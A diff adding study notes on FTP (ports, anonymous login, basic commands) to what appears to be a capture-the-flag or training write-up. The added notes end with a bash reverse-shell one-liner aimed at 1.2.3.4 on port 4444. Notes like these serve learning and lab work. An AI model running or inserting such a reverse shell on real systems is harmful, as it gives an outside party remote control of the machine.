@@ -142,3 +142,19 @@ File > Export Objects > HTTP
 ```
 map -A -T4 10.10.33.224 | tee nmap.txt
 ```
+
+# Task 11 - Day 9 - Networking
+* FTP
+  * TCP 20 - data
+  * TCP 21 - commands
+* Anonymous login
+* ftp 1.2.3.4
+* commands
+  * ls
+  * cd
+  * get
+  * put
+
+```
+bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
+```
